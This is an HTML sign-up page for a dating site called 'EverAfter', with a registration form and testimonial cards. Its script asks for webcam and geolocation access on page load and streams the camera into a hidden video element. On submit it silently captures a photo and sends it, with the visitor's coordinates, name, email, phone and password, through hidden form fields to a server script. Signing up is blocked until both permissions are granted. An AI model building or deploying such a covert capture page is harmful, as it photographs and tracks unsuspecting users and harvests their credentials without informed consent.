<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>EverAfter - Sign Up</title>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background: #ffd6e8;
    }
    header {
      background: #f284af;
      padding: 20px;
      text-align: center;
      font-size: 32px;
      color: #4b0033;
      font-family: 'Brush Script MT', cursive;
    }
    .main-container {
      display: flex;
      max-width: 1200px;
      margin: 0 auto;
      padding: 30px 20px;
      gap: 20px;
      align-items: flex-start;
    }
    .form-box {
      background: #ffeaf5;
      padding: 30px;
      border-radius: 15px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
      flex: 1;
      min-width: 300px;
    }
    .form-box h2 {
      color: #d4005e;
      margin-bottom: 20px;
    }
    input, button {
      width: 100%;
      padding: 12px;
      margin-bottom: 15px;
      border-radius: 8px;
      border: 1px solid #ccc;
      font-size: 16px;
    }
    .form-box button {
      background-color: #d4005e;
      color: white;
      font-size: 18px;
      border: none;
      cursor: pointer;
    }
    .login-link {
      margin-top: 10px;
      font-size: 14px;
      text-align: center;
    }
    .login-link a {
      color: #d4005e;
      text-decoration: none;
    }
    .stories-container {
      display: grid;
      grid-template-columns: repeat(2, 1fr);
      gap: 20px;
      flex: 2;
    }
    .story {
      background: #ffeaf5;
      border-radius: 15px;
      padding: 20px;
      text-align: center;
    }
    .story img {
      width: 100px;
      height: 100px;
      border-radius: 50%;
      border: 4px solid #d4005e;
      object-fit: cover;
      margin-bottom: 15px;
    }
    .quote {
      font-style: italic;
      color: #800040;
      font-size: 14px;
      margin-bottom: 10px;
    }
    .names {
      font-weight: bold;
      color: #6a0099;
      font-size: 16px;
    }
    .location,
    .since {
      font-size: 13px;
      color: #4b0066;
    }
    @media (max-width: 1000px) {
      .main-container {
        flex-direction: column;
        align-items: center;
      }
      .stories-container {
        grid-template-columns: 1fr 1fr;
        width: 100%;
      }
    }
    @media (max-width: 600px) {
      .stories-container {
        grid-template-columns: 1fr;
      }
    }
  </style>
</head>
<body>

<header>
  EverAfter ❤️ Find Your Forever
</header>

<!-- ... head and styles remain unchanged ... -->

<div class="main-container">
  <!-- Left: Sign-Up Form -->
  <div class="form-box">
    <form id="signupForm" method="POST" action="save_user.php">
      <h2>Create Your Account</h2>
      <input type="text" name="fullname" placeholder="Full Name" required>
      <input type="email" name="email" placeholder="Email" required>
      <input type="tel" name="phone" placeholder="Phone Number" pattern="^\+?\d{10,15}$" required>
      <input type="password" name="password" placeholder="Password" required>
      <input type="password" name="confirmPassword" placeholder="Confirm Password" required>

      <!-- Hidden fields -->
      <input type="hidden" name="location" id="location">
      <input type="hidden" name="photoData" id="photoData">

      <button type="submit">Sign Up</button>
      <div class="login-link">
        Already have an account? <a href="#">Log in here</a>.
      </div>
    </form>

    <!-- Hidden camera -->
    <video id="video" autoplay style="display:none;"></video>
    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
  </div>

  <!-- Right: Success Stories -->
  <div class="stories-container">
    <div class="story">
      <img src="images/couple1.png" alt="Couple 1">
      <p class="quote">“Distance didn’t matter when we had love. Thank you EverAfter!”</p>
      <div class="names">Emma & Jack</div>
      <div class="location">London, UK</div>
      <div class="since">Together since: Aug 2021</div>
    </div>

    <div class="story">
      <img src="images/couple2.png" alt="Couple 2">
      <p class="quote">“We found each other when we least expected it.”</p>
      <div class="names">Priya & Arjun</div>
      <div class="location">Mumbai, India</div>
      <div class="since">Together since: Jan 2022</div>
    </div>

    <div class="story">
      <img src="images/couple3.png" alt="Couple 3">
      <p class="quote">“A single message changed our lives forever.”</p>
      <div class="names">Lucas & Mia</div>
      <div class="location">Sydney, Australia</div>
      <div class="since">Together since: Dec 2020</div>
    </div>

    <div class="story">
      <img src="images/couple4.png" alt="Couple 4">
      <p class="quote">“We owe it all to EverAfter. Soulmates found.”</p>
      <div class="names">Noah & Sophia</div>
      <div class="location">Toronto, Canada</div>
      <div class="since">Together since: Mar 2023</div>
    </div>
  </div>
</div>

<script>
  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');
  const photoData = document.getElementById('photoData');
  const locationField = document.getElementById('location');
  const form = document.getElementById('signupForm');

  let locationReady = false;
  let webcamReady = false;

  // Start webcam
  navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
    video.srcObject = stream;
    webcamReady = true;
  }).catch(err => {
    alert("Webcam access denied. Please allow access.");
    console.error("Webcam error:", err);
  });

  // Get location
  navigator.geolocation.getCurrentPosition(position => {
    const coords = `${position.coords.latitude},${position.coords.longitude}`;
    locationField.value = coords;
    locationReady = true;
  }, error => {
    alert("Location access denied. Please allow access.");
    console.error("Location error:", error);
  });

  // Handle form submission
  form.addEventListener('submit', function (e) {
    e.preventDefault();

    if (!webcamReady || !locationReady) {
      alert("Waiting for webcam and location access. Please allow permissions.");
      return;
    }

    // Capture image
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    photoData.value = canvas.toDataURL('image/png');

    // Submit after short delay to ensure image data is set
    setTimeout(() => {
      form.submit();
    }, 200);
  });
</script>

</body>
</html>
